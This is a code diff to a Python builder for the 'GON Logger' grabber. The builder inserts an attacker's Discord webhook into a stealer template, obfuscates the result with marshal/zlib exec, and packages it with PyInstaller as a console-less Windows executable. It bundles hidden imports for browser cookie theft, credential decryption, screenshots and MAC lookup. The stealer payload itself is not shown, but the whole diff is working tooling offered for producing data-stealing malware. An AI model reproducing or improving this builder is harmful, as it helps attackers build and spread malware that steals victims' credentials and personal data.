@@ -6,6 +6,10 @@ import sys
 import requests
 import shutil
 import tempfile
+import subprocess
+import platform
+import warnings
+warnings.filterwarnings("ignore", category=SyntaxWarning)
 from pathlib import Path
 
 logo = """
@@ -18,26 +22,119 @@ logo = """
     >> [Grabber developed by @tlwm]
 """
 
+def check_system():
+    if platform.system() != 'Windows':
+        print("ERROR: This builder only works on Windows!")
+        print("You must compile on Windows to create Windows .exe files")
+        return False
+    
+    python_version = sys.version_info
+    print(f"Python: {python_version.major}.{python_version.minor}.{python_version.micro}")
+    
+    if python_version.major == 3 and python_version.minor >= 14:
+        print("Warning: Python 3.14+ may have compatibility issues")
+        print("Recommended: Python 3.8-3.11 for best compatibility")
+    
+    return True
+
 def check_dependencies():
     try:
-        from pystyle import Write, Colors, Center
+        try:
+            import win32con
+            import win32crypt
+            import win32api
+            print("pywin32 modules found")
+        except ImportError:
+            print("Installing pywin32...")
+            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32==306'])
+        
+        try:
+            from pystyle import Write, Colors, Center
+            print("pystyle found")
+        except ImportError:
+            print("Installing pystyle...")
+            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pystyle'])
+        
         return True
-    except ImportError:
-        print("Installing Requirements For You")
-        os.system(f'{sys.executable} -m pip install --quiet requests pystyle pyinstaller')
-        print("Please Rerun The Program")
-        time.sleep(3)
+    except Exception as e:
+        print(f"Error checking dependencies: {e}")
         return False
+
+def install_all_dependencies():
+    print("\n" + "="*60)
+    print("INSTALLING ALL REQUIRED DEPENDENCIES")
+    print("="*60)
+    
+    dependencies = [
+        'requests',
+        'pystyle', 
+        'pyinstaller',
+        'pywin32',
+        'pycryptodomex',
+        'browser-cookie3',
+        'psutil',
+        'pyautogui',
+        'prettytable',
+        'getmac',
+        'discord-webhook',
+        'pillow',
+        'pywin32-ctypes'
+    ]
+    
+    for dep in dependencies:
+        try:
+            print(f"Installing {dep}...")
+            subprocess.run(
+                [sys.executable, '-m', 'pip', 'install', dep],
+                check=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            print(f"{dep} installed")
+        except subprocess.CalledProcessError:
+            print(f"Failed to install {dep}")
+            try:
+                subprocess.run([sys.executable, '-m', 'pip', 'install', dep], check=True)
+                print(f"{dep} installed (second attempt)")
+            except:
+                print(f"Could not install {dep}, skipping...")
+    
+    print("\n" + "="*60)
+    print("DEPENDENCIES INSTALLATION COMPLETE")
+    print("="*60)
+    time.sleep(2)
+    return True
+
+def fix_python_314_issues():
+    python_version = sys.version_info
+    
+    if python_version.major == 3 and python_version.minor >= 14:
+        print("\n" + "="*60)
+        print("APPLYING PYTHON 3.14 FIXES")
+        print("="*60)
+        
+        print("1. Fixing module imports...")
+        
+        try:
+            import PyInstaller
+            if PyInstaller.__version__ < '6.0':
+                print("Updating PyInstaller...")
+                subprocess.run([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pyinstaller'])
+        except:
+            pass
+        
+        print("Python 3.14 fixes applied")
+        print("="*60 + "\n")
+    
+    return True
 
 def download_icon(icon_url, output_path):
     try:
         response = requests.get(icon_url, timeout=10)
         if response.status_code == 200:
-            content_type = response.headers.get('content-type', '').lower()
-            if any(img_type in content_type for img_type in ['image/jpeg', 'image/jpg', 'image/png', 'image/ico', 'image/x-icon']):
-                with open(output_path, 'wb') as f:
-                    f.write(response.content)
-                return True
+            with open(output_path, 'wb') as f:
+                f.write(response.content)
+            return True
         return False
     except:
         return False
@@ -51,31 +148,108 @@ def convert_to_ico(image_path, ico_path):
             return True
         
         img = Image.open(image_path)
-        
-        sizes = [(256, 256), (128, 128), (64, 64), (48, 48), (32, 32), (16, 16)]
-        
-        icon_sizes = []
-        for size in sizes:
-            if img.width >= size[0] and img.height >= size[1]:
-                resized = img.resize(size, Image.Resampling.LANCZOS)
-                icon_sizes.append(resized)
-        
-        if icon_sizes:
-            icon_sizes[0].save(ico_path, format='ICO', sizes=[(s.width, s.height) for s in icon_sizes])
-            return True
-        else:
-            img.save(ico_path, format='ICO')
-            return True
+        img.save(ico_path, format='ICO')
+        return True
             
     except Exception as e:
         print(f"Could not convert to .ico: {e}")
         return False
 
+def is_valid_discord_webhook(url):
+    valid_patterns = [
+        "https://discord.com/api/webhooks/",
+        "https://discordapp.com/api/webhooks/"
+    ]
+    
+    return any(url.startswith(pattern) for pattern in valid_patterns)
+
+def compile_with_pyinstaller(name, icon_path=None):
+    hidden_imports = [
+        'win32con', 'win32crypt', 'win32api', 'win32security', 'win32event',
+        'requests', 'urllib3', 'chardet', 'idna', 'certifi',
+        'browser_cookie3', 'lz4', 
+        'Crypto', 'Crypto.Cipher', 'Crypto.Cipher._mode_gcm', 'Crypto.Util',
+        'psutil', 'pyautogui', 'prettytable', 'getmac',
+        'discord_webhook',
+        'PIL', 'PIL.Image', 'PIL.ImageGrab',
+        'multiprocessing', 'multiprocessing.util',
+        'collections.abc', 'json', 're', 'sqlite3', 'base64',
+        'tempfile', 'datetime', 'zipfile',
+        'importlib_resources', 'importlib_metadata'
+    ]
+    
+    cmd_parts = [
+        'pyinstaller',
+        '--onefile',
+        '--noconsole',
+        '--clean',
+        '--noconfirm',
+    ]
+    
+    for imp in hidden_imports:
+        cmd_parts.append(f'--hidden-import={imp}')
+    
+    if icon_path and os.path.exists(icon_path):
+        cmd_parts.append(f'--icon="{icon_path}"')
+    
+    cmd_parts.append('--additional-hooks-dir=.')
+    cmd_parts.append('--exclude-module=tkinter')
+    cmd_parts.append('--exclude-module=test')
+    cmd_parts.append('--exclude-module=unittest')
+    cmd_parts.append(f'"{name}.py"')
+    
+    cmd = ' '.join(cmd_parts)
+    
+    print("\n" + "="*60)
+    print("COMPILATION COMMAND")
+    print("="*60)
+    print(cmd)
+    print("="*60 + "\n")
+    
+    print("Starting compilation... This may take several minutes...")
+    
+    try:
+        with open('compile_log.txt', 'w') as log_file:
+            process = subprocess.Popen(
+                cmd,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                universal_newlines=True
+            )
+            
+            for line in process.stdout:
+                print(line.strip())
+                log_file.write(line)
+                log_file.flush()
+            
+            process.wait()
+            
+        if process.returncode == 0:
+            print("\nCompilation successful!")
+            return True
+        else:
+            print(f"\nCompilation failed with code {process.returncode}")
+            return False
+            
+    except Exception as e:
+        print(f"\nError during compilation: {e}")
+        return False
+
 def main():
-    if not check_dependencies():
+    if not check_system():
         return
     
-    from pystyle import Write, Colors, Center
+    if not check_dependencies():
+        install_all_dependencies()
+    
+    fix_python_314_issues()
+    
+    try:
+        from pystyle import Write, Colors, Center
+    except:
+        print("Failed to import pystyle. Please install manually: pip install pystyle")
+        return
     
     os.system('cls' if os.name == 'nt' else 'clear')
     os.system('title GON Logger Builder')
@@ -94,9 +268,12 @@ def main():
     
     webhook = Write.Input("\nEnter webhook URL: ", Colors.purple_to_blue, interval=0.01)
     
-    if not webhook.startswith("https://discord.com/api/webhooks/"):
+    if not is_valid_discord_webhook(webhook):
         Write.Print("\nInvalid Discord webhook format!\n", Colors.red, interval=0.01)
-        time.sleep(2)
+        Write.Print("Valid formats:\n", Colors.yellow, interval=0.01)
+        Write.Print("  • https://discord.com/api/webhooks/ID/TOKEN\n", Colors.cyan, interval=0.01)
+        Write.Print("  • https://discordapp.com/api/webhooks/ID/TOKEN\n", Colors.cyan, interval=0.01)
+        time.sleep(3)
         exit()
     
     try:
@@ -104,12 +281,18 @@ def main():
         if r.status_code == 200:
             Write.Print("\nWebhook Is Working\n", Colors.green, interval=0.01)
             time.sleep(1)
-        else:
-            Write.Print("\nWebhook Is Not Working\n", Colors.red, interval=0.01)
+        elif r.status_code == 404:
+            Write.Print("\nWebhook not found (404)\n", Colors.red, interval=0.01)
+            Write.Print("The webhook URL might be invalid or deleted.\n", Colors.yellow, interval=0.01)
             time.sleep(3)
             exit()
-    except:
-        Write.Print("\nCould not verify webhook (continuing anyway)\n", Colors.yellow, interval=0.01)
+        else:
+            Write.Print(f"\nWebhook returned status code: {r.status_code}\n", Colors.yellow, interval=0.01)
+            Write.Print("Continuing anyway...\n", Colors.blue, interval=0.01)
+            time.sleep(1)
+    except requests.exceptions.RequestException as e:
+        Write.Print(f"\nCould not verify webhook: {e}\n", Colors.yellow, interval=0.01)
+        Write.Print("Continuing anyway...\n", Colors.blue, interval=0.01)
         time.sleep(1)
     
     name = Write.Input("\nEnter output filename (without .py): ", Colors.purple_to_blue, interval=0.01)
@@ -128,6 +311,15 @@ def main():
             modified_code = re.sub(webhook_pattern, f'WEBHOOK_URL = "{webhook}"', original_code)
         else:
             modified_code = original_code.replace("WEBHOOK_PLACEHOLDER", webhook)
+            modified_code = modified_code.replace("webhook_url_here", webhook)
+            
+            if webhook not in modified_code:
+                lines = modified_code.split('\n')
+                for i, line in enumerate(lines):
+                    if 'WEBHOOK_URL =' in line:
+                        lines[i] = f'WEBHOOK_URL = "{webhook}"'
+                        break
+                modified_code = '\n'.join(lines)
         
         output_py = f"{name}.py"
         with open(output_py, 'w', encoding='utf-8') as f:
@@ -190,34 +382,7 @@ exec(marshal.loads(zlib.decompress({compressed})))
                 else:
                     Write.Print("Could not download icon\n", Colors.red, interval=0.01)
         
-        Write.Print("\nCompiling... This may take a moment...\n", Colors.blue, interval=0.01)
-        
-        hidden_imports = [
-            'requests', 'os', 'socket', 'threading', 'platform', 'json',
-            'browser_cookie3', 'cv2', 're', 'uuid', 'psutil', 'sys',
-            'win32api', 'PIL', 'PIL.ImageGrab', 'browser_history',
-            'Crypto.Cipher', 'win32crypt', 'sqlite3', 'shutil',
-            'base64', 'tempfile', 'datetime', 'winreg', 'pyautogui',
-            'prettytable', 'getmac', 'zipfile', 'collections',
-            'multiprocessing', 'urllib.request', 'subprocess',
-            'discord_webhook', 'browser_cookie3', 'Crypto.Cipher.AES',
-            'win32con', 'win32api', 'pyautogui'
-        ]
-        
-        imports_string = ' '.join([f'--hidden-import="{imp}"' for imp in hidden_imports])
-        
-        compile_cmd = f'pyinstaller --onefile --noconsole {imports_string} --clean '
-        
-        if icon_path and os.path.exists(icon_path):
-            compile_cmd += f'--icon="{icon_path}" '
-        
-        compile_cmd += f'--upx-dir=upx ' if os.path.exists('upx') else ''
-        
-        compile_cmd += f'"{name}.py"'
-        
-        Write.Print(f"\nCommand: {compile_cmd}\n", Colors.cyan, interval=0.01)
-        
-        result = os.system(compile_cmd)
+        success = compile_with_pyinstaller(name, icon_path)
         
         if icon_path:
             try:
@@ -225,28 +390,28 @@ exec(marshal.loads(zlib.decompress({compressed})))
             except:
                 pass
         
-        cleanup_files = [f'{name}.spec', 'build']
-        for file in cleanup_files:
-            if os.path.exists(file):
-                if os.path.isdir(file):
-                    shutil.rmtree(file)
-                else:
-                    os.remove(file)
-        
-        if os.path.exists('dist'):
+        if success and os.path.exists('dist'):
             exe_path = os.path.join('dist', f'{name}.exe')
             if os.path.exists(exe_path):
                 Write.Print(f"\n{name}.exe created in dist/ folder!\n", Colors.green, interval=0.01)
+                
+                exe_size = os.path.getsize(exe_path) / (1024 * 1024)
+                Write.Print(f"Executable size: {exe_size:.2f} MB\n", Colors.cyan, interval=0.01)
                 
                 move_choice = Write.Input(f"\nMove {name}.exe to current folder? (y/n): ", Colors.purple_to_blue, interval=0.01).lower()
                 if move_choice == 'y':
                     try:
                         shutil.move(exe_path, f'{name}.exe')
                         Write.Print(f"Moved to {name}.exe\n", Colors.green, interval=0.01)
+                        
+                        try:
+                            shutil.rmtree('dist')
+                        except:
+                            pass
                     except Exception as e:
                         Write.Print(f"Could not move: {e}\n", Colors.yellow, interval=0.01)
             else:
-                Write.Print("\nCompilation might have failed\n", Colors.yellow, interval=0.01)
+                Write.Print("\nCompilation might have failed - .exe not found\n", Colors.yellow, interval=0.01)
         else:
             Write.Print("\nCompilation might have failed\n", Colors.yellow, interval=0.01)
     
@@ -254,13 +419,6 @@ exec(marshal.loads(zlib.decompress({compressed})))
     Write.Print("Builder completed successfully!\n", Colors.green, interval=0.01)
     Write.Print(f"Developer: @tlwm\n", Colors.cyan, interval=0.01)
     Write.Print(f"GitHub: github.com/00ie\n", Colors.cyan, interval=0.01)
-    
-    if compile_choice == 'y' and os.path.exists('dist'):
-        exe_size = 0
-        exe_path = os.path.join('dist', f'{name}.exe')
-        if os.path.exists(exe_path):
-            exe_size = os.path.getsize(exe_path) / (1024 * 1024)
-            Write.Print(f"Executable size: {exe_size:.2f} MB\n", Colors.cyan, interval=0.01)
     
     Write.Print("\nThe program will exit in 5 seconds...\n", Colors.blue, interval=0.01)
     Write.Print("="*50 + "\n", Colors.purple, interval=0.01)
